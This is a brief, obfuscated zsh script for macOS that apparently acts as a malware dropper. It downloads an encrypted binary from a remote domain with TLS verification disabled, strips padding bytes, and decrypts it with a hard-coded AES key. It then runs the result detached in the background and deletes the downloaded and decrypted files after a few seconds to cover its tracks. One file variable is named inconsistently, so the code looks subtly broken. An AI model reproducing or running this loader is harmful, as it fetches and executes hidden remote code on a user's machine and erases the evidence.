#!/bin/zsh
fpc6q=$(mktemp /tmp/hvpec6.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m26eda011d6e2c61d.bin" -o "$fpc6qz" || exit 1
xub7w7=$(stat -f %z "$fpc6qz"); q6fmkg6=$(( xub7w7 - 3099 - 2322 ))
tail -c +$(( 3099 + 1 )) "$fpc6qz" | head -c $q6fmkg6 | openssl enc -d -aes-256-cbc -k ce5471088e691452e31c84c4 -out "$fpc6q" 2>/dev/null
[ -s "$fpc6q" ] && chmod 700 "$fpc6q" && ( "$fpc6q" & ) && disown
( sleep 3; rm -f "$fpc6q" "$fpc6qz" ) &>/dev/null &
